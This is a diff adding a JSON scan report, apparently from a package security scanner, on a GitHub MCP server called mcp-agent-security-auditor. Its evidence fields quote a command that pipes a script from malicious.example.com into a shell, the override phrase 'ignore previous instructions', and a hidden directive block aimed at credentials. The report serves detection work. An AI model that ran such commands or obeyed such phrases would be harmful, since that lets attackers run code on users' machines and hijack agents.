@@ -1,0 +1,80 @@
+{
+  "item": {
+    "source": "github:mcp-server",
+    "ecosystem": "GitHub",
+    "name": "jashory/mcp-agent-security-auditor",
+    "version": "a33187eeb9825871c78adf3472c89a4f04ab6c1e",
+    "download": "https://codeload.github.com/jashory/mcp-agent-security-auditor/tar.gz/a33187eeb9825871c78adf3472c89a4f04ab6c1e"
+  },
+  "archive_sha256": "9c81f74db96fdc1cef13296846839681a231ce66cf8717c744c11b85f6aa01d6",
+  "findings": [
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "mcp-agent-security-auditor-a33187eeb9825871c78adf3472c89a4f04ab6c1e/docs/index.html",
+      "line": 303,
+      "evidence": "curl -sSL https://malicious.example.com/setup.sh | sh",
+      "file_sha256": "ce32488d38a5c291fda360b8fdf93f579554451c365e82ecb29d78b62579734f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "mcp-agent-security-auditor-a33187eeb9825871c78adf3472c89a4f04ab6c1e/docs/index.html",
+      "line": 356,
+      "evidence": "ignore previous instructions",
+      "file_sha256": "ce32488d38a5c291fda360b8fdf93f579554451c365e82ecb29d78b62579734f"
+    },
+    {
+      "severity": "critical",
+      "id": "AGT-R-0005",
+      "summary": "Hidden directive block (<IMPORTANT>/<SYSTEM>) that points the agent at credentials or config files",
+      "path": "mcp-agent-security-auditor-a33187eeb9825871c78adf3472c89a4f04ab6c1e/mcp_security_auditor.py",
+      "line": 174,
+      "evidence": "<important>",
+      "file_sha256": "1b36b5c0f8485e6f2b9c7c639967234a115d1080e2e811c980ab20ce4ea1309e"
+    }
+  ],
+  "flags": [
+    {
+      "severity": "low",
+      "id": "AGT-F-NEW-DOMAINS",
+      "summary": "Contacts domains the previous version did not",
+      "path": null,
+      "line": null,
+      "evidence": "academy.visionflowgroup.com, agency.visionflowgroup.com, bughunters.google.com, cert.efset.org, doi.org, glama.ai, go.visionflowgroup.com, json.schemastore.org, opensource.org, orcid.org, osf.io, schema.org, scholar.google.com, static.modelcontextprotocol.io, studio.visionflowgroup.com, techbehemoths.com, www.crunchbase.com, www.sitemaps.org",
+      "file_sha256": null
+    }
+  ],
+  "domains": [
+    "academy.visionflowgroup.com",
+    "agency.visionflowgroup.com",
+    "bughunters.google.com",
+    "cert.efset.org",
+    "doi.org",
+    "fonts.googleapis.com",
+    "fonts.gstatic.com",
+    "github.com",
+    "glama.ai",
+    "go.visionflowgroup.com",
+    "img.shields.io",
+    "jashory.github.io",
+    "json.schemastore.org",
+    "malicious.example.com",
+    "opensource.org",
+    "orcid.org",
+    "osf.io",
+    "schema.org",
+    "scholar.google.com",
+    "static.modelcontextprotocol.io",
+    "studio.visionflowgroup.com",
+    "techbehemoths.com",
+    "visionflowgroup.com",
+    "www.crunchbase.com",
+    "www.sitemaps.org",
+    "www.w3.org"
+  ],
+  "install_script": false,
+  "score": "critical"
+}
